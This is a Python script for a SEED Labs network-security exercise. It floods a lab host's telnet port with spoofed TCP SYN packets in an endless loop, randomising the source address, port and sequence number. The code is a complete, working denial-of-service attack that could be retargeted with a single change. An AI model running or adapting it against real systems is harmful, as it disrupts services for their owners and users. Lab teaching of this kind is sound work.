#!/usr/bin/env python3
"""
Task 1.1: SYN Flooding Attack using Python
SEED Labs - TCP/IP Attack Lab

This script sends spoofed TCP SYN packets to flood the victim's
half-open connection queue, preventing legitimate connections.

Usage:
    python3 synflood.py
"""

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

# Target victim server and telnet port
VICTIM_IP = "10.9.0.5"
VICTIM_PORT = 23  # telnet port

ip = IP(dst=VICTIM_IP)
tcp = TCP(dport=VICTIM_PORT, flags='S')
pkt = ip / tcp

while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32)))  # random source IP
    pkt[TCP].sport = getrandbits(16)                  # random source port
    pkt[TCP].seq = getrandbits(32)                    # random sequence number
    send(pkt, verbose=0)
